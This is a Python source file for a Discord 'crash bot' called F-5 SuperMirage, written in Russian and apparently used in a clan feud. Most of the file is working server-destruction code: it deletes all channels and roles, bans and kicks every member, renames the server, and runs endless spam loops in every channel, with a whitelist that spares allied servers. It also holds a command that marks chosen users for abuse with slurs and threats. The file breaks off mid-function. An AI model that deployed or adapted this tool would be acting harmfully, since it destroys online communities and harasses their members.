# -*- coding: utf-8 -*-
try:
    from colorama import init
    from colorama import Fore, Back, Style
    from colorama import Fore
    import discord
    from discord import *
    from discord.ext import commands
    from discord import FFmpegPCMAudio
    import requests
    import asyncio
    import time
    import colorama
    import json
    import aiohttp
    import random
    init()
except:
    print('ERROR | Пожалуйста, установи библиотеки discord, asyncio, colorama')
    input()

try:
 with open('token.txt','r') as f:
    token = f.read()
except:
 with open('token.txt','w+') as f:
    print(f'{Fore.BLUE}Отлично! Всё работает! Теперь введи токен бота в token.txt и перезапусти консоль')
    print('Не забудь включить Members intents в разделе Bot!')
    input()
else:
    print(f'{Fore.BLUE}Бот начал запуск...')

prefix = '>'

# подробные настройки
channelsn = 'save-the-repkx'
rolesn = 'Save the REPKX!'
namen = 'Спасайте Республику!'
iconn = 'rep.PNG'
hooknamen = 'Save the REPKX!'
botnamen = 'F-5 SuperMirage'
inviten = 'https://discord.gg/QbQ7PYYuUu'
spamtextn = f'Данный сервер был подвергнут атаке краш-бота F-5 SuperMirage.\nЯ не хотел использовать этого бота на свой же сервер с большой историей. Но поскольку его превратили в какой-то авторитарный пиздец - извиняйте. Я могу предоставить настоящий сервер, где глава находится у человека, которому не насрать на будущее своего клана, который борется не за власть, а за судьбу Республики.\nВам нужны великие потрясения? А нам нужна **великая Республика.**\nСервер поддержки: {inviten}'
admins = [800077849251151904]
reasonn = 'Спасайте Республику!'

intents = discord.Intents.all()
intents.members = True
intents.typing = True
intents.presences = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command('help')
@bot.event
async def on_ready():
    with open('invite.txt','w') as f:
        f.write(f'https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')
    await bot.change_presence(activity=discord.Game(name=f'Снова в деле!'))
    print(f'{Fore.BLUE}Краш бот {Fore.WHITE}{botnamen}{Fore.BLUE} запущен! Для получения списка команд добавьте бота на сервер и пропишите {prefix}help\nСсылка для добавления бота записана в файл invite.txt')

@bot.command()
async def addwl(ctx,idd=None):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif idd == None:
        await ctx.send(embed=discord.Embed(title='Ошибка ❌',description='Укажите ID сервера!',colour=discord.Colour.from_rgb(122,0,0)))
    elif int(ctx.author.id) in admins:
        with open('wl.json','r') as f:
            bd = json.load(f)
        bd["wl"].append(int(idd))
        with open('wl.json','w') as f:
            json.dump(bd,f)
        await ctx.send(embed=discord.Embed(title='Успешно',description=f'Теперь данный сервер НЕЛЬЗЯ крашнуть! :flag_us:',colour=discord.Colour.from_rgb(81,136,152)))
    else:
        await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!',colour=discord.Colour.from_rgb(122,0,0)))

@bot.event
async def on_guild_join(guild):# при входе бота на сервер
  with open('wl.json','r') as f:
    wls = json.load(f) #вайтлист серверов!
  if int(guild.id) in wls["wl"]:
    async for entry in guild.audit_logs(limit=2,action=discord.AuditLogAction.bot_add):
        user = entry.user
        iddd = entry.user.id
    for c in guild.text_channels:
      try:
        await c.send(embed=discord.Embed(title=f'Сервер "{guild}" находится в белом списке! 🕊️',description=f'Обратите внимание, что данный сервер находится в белом списке, и крашнуть его не предоставляется возможным!',colour=discord.Colour.from_rgb(81,136,152)))
      except:
        pass
      else:
        break
  else:
    print(f'{Fore.YELLOW}Меня добавили на новый сервер: {Fore.WHITE}{guild}')

@bot.command()
async def help(ctx, arg=''):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif arg == 'crash':
        with open('pediks.json', 'r') as g:
            pds = json.load(g)
        if int(ctx.author.id) in pds["pediks"]:
            pass
        else:
            embed = discord.Embed(
                title = 'Краш-команды F-5 "SuperMirage"',
                description = f'F-5 "SuperMirage" не только сохранил достоинства прошлого бота, но и получил ряд новых улучшений и возможностей. В частности, теперь доступны команды частичного краша.\n**Вы можете ознакомиться с ними ниже.**\n\n`{prefix}nuke` - полный краш сервера.\n`{prefix}delchannels` - удалить все каналы на сервере.\n`{prefix}delroles` - удалить все роли на сервере.\n`{prefix}createchannels (кол-во)` - создает определенное кол-во каналов.\n`{prefix}createroles (кол-во)` - создает определенное кол-во ролей.\n`{prefix}rename` - изменить иконку и установить имя серверу (имя иконки - `{iconn}`, имя крашнутого сервера - `{namen}`).\n`{prefix}banall` - бан всех участников сервера.\n`{prefix}kickall` - кикнуть всех участников сервера.\n`{prefix}spamallchannels` - спам во все каналы от лица бота (очень мощный).\n`{prefix}spamallchannels_destructive` - спам во все каналы от лица бота с максимальной мощностью.\n\n **ВНИМАНИЕ! ИСПОЛЬЗУЙТЕ ЭТУ КОМАНДУ НА СВОЙ СТРАХ И РИСК! В результате тестирования у участников переставал работать нормально Discord, и требовалось его переустанавливать.**\n\n`{prefix}spam` - спам в текущий канал.\n`{prefix}addwl [ ID сервера ]` - добавить сервер в вайт-лист (его нельзя будет крашнуть, только для админов).',
                colour = discord.Colour.from_rgb(81,136,152)
            )

        await ctx.send(embed=embed)
        return
    elif arg == 'status':
        with open('pediks.json', 'r') as g:
            pds = json.load(g)
        if int(ctx.author.id) in pds["pediks"]:
            pass
        else:
            embed = discord.Embed(
                title = 'Команды статуса F-5 "SuperMirage"',
                description = f'Отличительной чертой F-5 "SuperMirage" является возможность кастомизировать статус бота. Админы могут настроить статус под свой вкус, а также включить невидимку для того чтобы бот был максимально незаметен.\n**Обратите внимание, что данные команды могут использовать только админы бота.**\n\n`{prefix}status stream (стрим)` - установить статус "Стримит" с вашим названием стрима.\n`{prefix}status watching (имя стрима)` - установить статус "Смотрит".\n`{prefix}status listening (песня)` - установить статус "Слушает".\n`{prefix}status playing (игра)` - установить статус "Играет".\n\n`{prefix}status_on` - стандартный режим бота.\n`{prefix}status_off` - скрытный режим бота.',
                colour = discord.Colour.from_rgb(81,136,152)
            )

        await ctx.send(embed=embed)
        return
    elif arg == 'rofls':
        with open('pediks.json', 'r') as g:
            pds = json.load(g)
        if int(ctx.author.id) in pds["pediks"]:
            pass
        else:
            embed = discord.Embed(
                title='Команды для веселья F-5 "SuperMirage" (Work In Progress)',
                description=f'Кто сказал, что краш-боты не могут быть весёлыми? Здесь представлены команды, с помощью которых можно порофлить!\n\n`{prefix}clan_draw` - жеребьёвка среди КХ-кланов, выбирает случайный КХ-клан.\n`{prefix}coin_toss` - подброс монетки (c шансом 1 к 4600 монетка может встать на ребро!).\n`{prefix}ball (вопрос)` - стандартный шар предсказаний.\n`{prefix}music` - пизда вьетконгу бассбуст.\n`{prefix}add_pedik (упоминание)` - вас бесит какой-то андрюшенька-коммунист? Напишите эту команду, и SuperMirage быстро его усмирит... (только для админов бота)\n`{prefix}remove_pedik (упоминание)` - наконец, этот андрюшенька-коммунист побежал плакаться к своей маме? Тогда вы можете отключить режим гнобления! (только для админов бота)',
                colour=discord.Colour.from_rgb(81, 136, 152))
            await ctx.send(embed=embed)
            return
    else:
        embed = discord.Embed(
            title = '**F-5 "SuperMirage"**',
            description = f'*850 строк чистой демократии!*\n\nF-5 "SuperMirage" - краш-бот Республики Кантрихуманс третьего поколения, заменяющий за собой краш-бот второго поколения Mirage. В отличие от краш-ботов других кланов, SuperMirage имеет авторский код, расположен на домашнем сервере REPKX и имеет достаточно широкий функционал.\n\n`{prefix}help crash` - помощь по разделу "Краш-команды"\n`{prefix}help status` - помощь по разделу "Команды статуса"\n`{prefix}help rofls` - помощь по разделу "Команды для веселья" (WIP)\n\n `{prefix}echo_test (любое слово)` - проверка бота на отклик, в норме должен вернуть значение.',
            colour = discord.Colour.from_rgb(81,136,152)
        )
        embed.set_author(name="Республика Кантрихуманс представляет...")
        await ctx.send(embed=embed)

@bot.command()
async def echo_test(ctx, message: str):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    else:
        print(f'{Fore.BLUE}Команда вызвана, консоль получает значение!')
        await ctx.send(message)

@bot.command()
async def status(ctx, arg='', *, names=''):
  with open('pediks.json', 'r') as g:
        pds = json.load(g)
  if int(ctx.author.id) in pds["pediks"]:
        pass
  elif int(ctx.author.id) in admins:
    bll = ['']
    if arg == 'stream' and names not in bll:
        await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=names, url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watching' and names not in bll:
        await bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.watching, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'listening' and names not in bll:
        await bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.listening, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'playing' and names not in bll:
        await bot.change_presence(status=discord.Status.online, activity=discord.Game(name=names))
        await ctx.message.add_reaction('✅')
    else:
        embed = discord.Embed(
            title = 'Ошибка ❌',
            description = f'Вы не указали статус или имя для него, либо указали неверный тип статуса\nВведите `{prefix}help status` для получения информации о данной команде',
            colour = discord.Colour.from_rgb(122,0,0)
        )
        await ctx.send(embed=embed)
  else:
    await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!', colour=discord.Colour.from_rgb(122, 0, 0)))

@bot.command()
async def nuke(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        timer = time.time()
        nameold = ctx.guild.name
        try:
            with open(iconn, 'rb') as f:
                icon = f.read()
                await ctx.guild.edit(name=namen, icon=icon)
        except:
            print(f'{Fore.RED}[ - ] Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"{Fore.RED}, продолжаю краш сервера')
        else:
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: иконка и имя серверу изменены')

        for channell in ctx.guild.channels:
            try:
                await channell.delete(reason=reasonn)
            except:
                print(f'{Fore.RED}[ - ] Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.GREEN}, продолжаю краш сервера...')
            else:
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён')


        for roleee in ctx.guild.roles:
            try:
                await roleee.delete(reason=reasonn)
            except:
                print(f'{Fore.RED}[ - ]Не могу удалить роль {Fore.GREEN}{roleee.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.RED}, продолжаю краш')
            else:
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Роль {Fore.GREEN}@{roleee}{Fore.YELLOW} удалена')

        c = await ctx.guild.create_text_channel(channelsn)

        for i in range(250):
            try:
                chh = await ctx.guild.create_text_channel(channelsn)
                await ctx.guild.create_role(name=rolesn)
            except:
                print(f'{Fore.RED}[ - ] Не смог создать роль/канал на каком либо сервере')
            else:
                print(f'{Fore.YELLOW}[ + ] Создана роль: {Fore.GREEN}@{rolesn}')
                print(f'{Fore.YELLOW}[ + ] Создан канал: {Fore.GREEN}#{channelsn}')

@bot.command()
async def delchannels(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        count = 0
        for channell in ctx.guild.channels:
            try:
                await channell.delete(reason=reasonn)
            except:
                print(f'{Fore.RED}[ - ] Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...')
            else:
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён')
                count+=1

        await ctx.author.send(embed=discord.Embed(title='Каналы успешно удалены!',description=f'Было удалено {count} каналов.',colour=discord.Colour.from_rgb(81,136,152)))

@bot.command()
async def delroles(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        count = 0
        for r in ctx.guild.roles:
            try:
                await r.delete(reason=reasonn)
                count+=1
            except:
                print(f'{Fore.RED}[ - ] Не смог удалить роль {Fore.GREEN}{r}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...')
            else:
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{r}{Fore.YELLOW} удалена')
                count+=1

        await ctx.author.send(embed=discord.Embed(title='Роли успешно удалены!',description=f'Было удалено {count} ролей.',colour=discord.Colour.from_rgb(81,136,152)))


@bot.command()
async def createchannels(ctx, count):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        good = 0
        for i in range(int(count)):
            try:
                await ctx.guild.create_text_channel(channelsn)
            except:
                print(f'{Fore.RED}[ - ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Канал {Fore.GREEN}#{channelsn}{Fore.RED} не был создан')
            else:
                good+=1
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channelsn}{Fore.YELLOW} был создан')

        await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} каналов.',colour=discord.Colour.from_rgb(81,136,152)))


@bot.command()
async def createroles(ctx, count):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        good=0
        for i in range(int(count)):
            try:
                await ctx.guild.create_role(name=rolesn)
            except:
                print(f'{Fore.RED}[ - ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Роль {Fore.GREEN}@{rolesn}{Fore.RED} не была создана')
            else:
                good+=1
                print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{rolesn}{Fore.YELLOW} была создана')

        await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} ролей.',colour=discord.Colour.from_rgb(81,136,152)))


async def spamhook(ctx,ch):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
         try:
            hooklist = await ch.webhooks()
            while True:
                for hook in hooklist:
                    await hook.send(content=spamtextn, wait=True)
         except:
            pass

@bot.command()
async def rename(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        n = ctx.guild
        try:
            with open(iconn, 'rb') as f:
                icon = f.read()
                await ctx.guild.edit(name=namen, icon=icon)
        except:
            await ctx.author.send(embed=discord.Embed(title='Ошибка!',description=f'Что-то пошло не так, и я не смог поменять имя и аватарку этому серверу',colour=discord.Colour.from_rgb(122,0,0)))
            print(f'{Fore.RED}[ - ]Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"')
        else:
            print(f'{Fore.GREEN}[ + ] Сменил иконку и имя серверу {Fore.YELLOW}{n}')
            await ctx.author.send(embed=discord.Embed(title=f'Успешно изменено имя и иконка серверу "{n}"!', colour =discord.Colour.from_rgb(81,136,152)))

@bot.command()
async def banall(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        count = 0
        for jktimosha in ctx.guild.members:
            if int(jktimosha.id) != int(ctx.message.author.id):
                try:
                    await ctx.guild.ban(jktimosha, reason=reasonn)
                except:
                    print(f'{Fore.RED}[ - ] Не забанил участника {Fore.YELLOW}{jktimosha.name}')
                else:
                    print(f'{Fore.GREEN}[ + ] Забанил участника {Fore.YELLOW}{jktimosha.name}')
                    count+=1

        await ctx.author.send(embed=discord.Embed(title=f'Забанено {count} человек.',colour=discord.Colour.from_rgb(81,136,152)))

@bot.command()
async def kickall(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        count = 0
        for jktimosha in ctx.guild.members:
            if int(jktimosha.id) != int(ctx.message.author.id):
                try:
                    await ctx.guild.kick(jktimosha, reason=reasonn)
                except:
                    print(f'{Fore.RED}[ - ] Не кикнул участника {Fore.YELLOW}{jktimosha.name}')
                else:
                    print(f'{Fore.GREEN}[ + ] Кикнул участника {Fore.YELLOW}{jktimosha.name}')
                    count+=1
        await ctx.author.send(embed=discord.Embed(title=f'Кикнуто {count} человек.',colour=discord.Colour.from_rgb(81,136,152)))

async def send(ctx,channel):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        try:
            await channel.send(spamtextn)
        except:
            print(f'{Fore.RED}[ - ] Не отправил спам в канал {Fore.YELLOW}#{channel}')
        else:
            print(f'{Fore.GREEN}[ + ] Отправил спам в канал {Fore.YELLOW}#{channel}')

@bot.command()
async def spamallchannels(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        for channel in ctx.guild.text_channels:
            asyncio.create_task(send(ctx,channel))

@bot.command()
async def spamallchannels_destructive(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        for i in range(250):
            for channel in ctx.guild.text_channels:
                asyncio.create_task(send(ctx,channel))


@bot.command()
async def spam(ctx):
    with open('wl.json', 'r') as f:
        wls = json.load(f)  # вайтлист серверов!
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.guild.id) in wls["wl"]:
        user = ctx.message.author
        iddd = ctx.message.author.id
        for c in ctx.guild.text_channels:
            try:
                await c.send(embed=discord.Embed(title='Попытка краша сервера из белого списка! 🚨',
                                                 description=f'Данный сервер находится в белом списке, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',
                                                 colour=discord.Colour.from_rgb(122, 0, 0)))
            except:
                pass
            else:
                break
    else:
        while True:
            await ctx.send(spamtextn)

@bot.command()
async def status_off(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.author.id) in admins:
        await bot.change_presence(status=discord.Status.offline)
        await ctx.message.add_reaction('✅')
    else:
        await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!', colour=discord.Colour.from_rgb(122, 0, 0)))

@bot.command()
async def status_on(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif int(ctx.author.id) in admins:
        await bot.change_presence(status=discord.Status.online)
        await ctx.message.add_reaction('✅')
    else:
        await ctx.send(embed=discord.Embed(title='У вас недостаточно прав!', colour=discord.Colour.from_rgb(122, 0, 0)))

@bot.command(pass_context = True)
async def music(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    elif (ctx.author.voice):
        await ctx.send(f'{ctx.author.mention}, 120 децибелл чистейшей демократии уже мчатся к вам!')
        await ctx.send(file=discord.File('goodmornin.gif'))
        channel = ctx.message.author.voice.channel
        voice = await channel.connect()
        source = FFmpegPCMAudio('MURICA.mp3')
        player = voice.play(source)
        if (ctx.guild.voice_client):  # If the bot is in a voice channel
            await asyncio.sleep(125)
            await ctx.guild.voice_client.disconnect()
    else:
        await ctx.send(f'{ctx.author.mention}, подключись сначала к голосовому каналу!')

@bot.command()
async def clan_draw(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    else:
        rand1 = ['REPKX', 'ATD5']
        rand2 = ['EMPCH', '-NFQS']
        rand3 = ['-CCCK', 'KYL1G']
        rand4 = ['UKXKB', 'BYLIT']
        rand5 = ['GRRUS', 'VMAPG']
        r = (random.randint(1, 1000))
        if r < 200:
            randc = (random.choice(rand1))
        elif r >= 200 and r < 400:
            randc = (random.choice(rand2))
        elif r >= 400 and r < 600:
            randc = (random.choice(rand3))
        elif r >= 600 and r < 800:
            randc = (random.choice(rand4))
        elif r >= 800:
            randc = (random.choice(rand5))
        await ctx.reply(f'Жеребьёвка выдала клан: **{randc}**')

@bot.command()
async def coin_toss(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    else:
        r = (random.randint(1, 4599))
        if r == 1:
            await ctx.reply(f':warning: Так, вот послушай, я абсолютно без понятия, как тебе это удалось, возможно ты подкрутил в моей программе шансы, но твоя монетка встала **на ребро!** :clap: :clap: ')
        elif r > 1 and r <= 2299:
            await ctx.reply(f'Вам выпал **орёл!** :coin: ')
        elif r > 2299 and r <= 4599:
            await ctx.reply(f'Вам выпала **решка!** :coin: ')

@bot.command()
async def ball(ctx):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        pass
    else:
        a = (random.randint(1, 20))
    if a == 1:
        await ctx.reply(f'Мой ответ - **Бесспорно** :thumbsup: ')
    if a == 2:
        await ctx.reply(f'Мой ответ - **Предрешено** :thumbsup: ')
    if a == 3:
        await ctx.reply(f'Мой ответ - **Определённо да** :thumbsup: ')
    if a == 4:
        await ctx.reply(f'Мой ответ - **Можешь быть уверен в этом** :thumbsup: ')
    if a == 5:
        await ctx.reply(f'Мой ответ - **Никаких сомнений** :thumbsup: ')
    if a == 6:
        await ctx.reply(f'Мой ответ - **Кажется, что да** :white_check_mark: ')
    if a == 7:
        await ctx.reply(f'Мой ответ - **Вероятнее всего** :white_check_mark: ')
    if a == 8:
        await ctx.reply(f'Мой ответ - **Хорошие перспективы** :white_check_mark: ')
    if a == 9:
        await ctx.reply(f'Мой ответ - **Знаки говорят — «да»** :white_check_mark: ')
    if a == 10:
        await ctx.reply(f'Мой ответ - **Да** :white_check_mark: ')
    if a == 11:
        await ctx.reply(f'Мой ответ - **Пока не ясно, попробуй снова** :warning: ')
    if a == 12:
        await ctx.reply(f'Мой ответ - **Спроси позже** :warning: ')
    if a == 13:
        await ctx.reply(f'Мой ответ - **Лучше будет не рассказывать** :warning: ')
    if a == 14:
        await ctx.reply(f'Мой ответ - **Сейчас нельзя сказать** :warning: ')
    if a == 15:
        await ctx.reply(f'Мой ответ - **Сконцентрируйся и спроси опять** :warning: ')
    if a == 16:
        await ctx.reply(f'Мой ответ - **Даже не думай** :x: ')
    if a == 17:
        await ctx.reply(f'Мой ответ - **Нет** :x: ')
    if a == 18:
        await ctx.reply(f'Мой ответ - **По моим данным — «нет»** :x: ')
    if a == 19:
        await ctx.reply(f'Мой ответ - **Перспективы не очень хорошие** :x: ')
    if a == 20:
        await ctx.reply(f'Мой ответ - **Весьма сомнительно** :x: ')

@bot.command()
async def add_pedik(ctx, member:discord.Member):
    with open('pediks.json', 'r') as g:
        pds = json.load(g)
    if int(ctx.author.id) in pds["pediks"]:
        await ctx.reply(f'Даже не думай, чмырь ебанный, пока ты своё ебало не закроешь, я тоже не закрою, сукин ты сын')
    elif int(ctx.author.id) in admins:
        user = member
        iddd = member.id
        with open('pediks.json', 'r') as f:
            bd = json.load(f)
        bd["pediks"].append(int(iddd))
        with open('pediks.json', 'w') as f:
            json.dump(bd, f)
        await ctx.send(f'{member.mention}, а ну-ка быстро завалил своё ебало блять, пока я тебе его не сломала нахуй. Тебе лучше не иметь дело с краш-ботом сука.')
    else:
